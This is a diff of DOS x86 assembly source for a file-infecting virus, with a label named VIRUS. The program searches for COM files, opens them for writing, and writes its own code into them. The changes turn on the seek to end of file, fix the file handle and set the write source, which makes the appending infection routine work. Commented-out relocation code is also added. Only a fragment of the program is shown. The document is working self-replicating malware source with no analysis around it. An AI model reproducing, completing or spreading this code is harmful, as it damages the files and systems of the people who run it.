@@ -1,11 +1,16 @@
 .model small
 .code    
-FNAME   EQU     9EH   
     ORG 100H  
     
 START:  
-
+;HOST:
+;   jmp near ptr START
 VIRUS:
+;START:
+;   call GET_START
+;GET_START:
+;   pop di
+;   sub di,offset GET_START
     mov ah,4EH
     mov dx,OFFSET COM_FILE
     int 21H     
@@ -14,15 +19,17 @@ SEARCH_LP:
     jc DONE
     mov ax,3D02H 
     mov dx,FNAME
-    int 21H               
+    int 21H 
+    mov bx,ax
     
-;    xor cx,cx
-;    mov dx,cx           ;cx:dx=0
-;    mov ax,4202H        ; move to end of file
-;    int 21H
+    xor cx,cx
+    mov dx,cx           ;cx:dx=0
+    mov ax,4202H        ; move to end of file
+    int 21H
     
     mov cx, OFFSET ENDVIR - OFFSET VIRUS
-    lea dx,[di+VIRUS]  
+    ;lea dx,[di+VIRUS]  
+    mov dx,100h
     xchg ax,bx 
     mov ah,40H
     int 21H
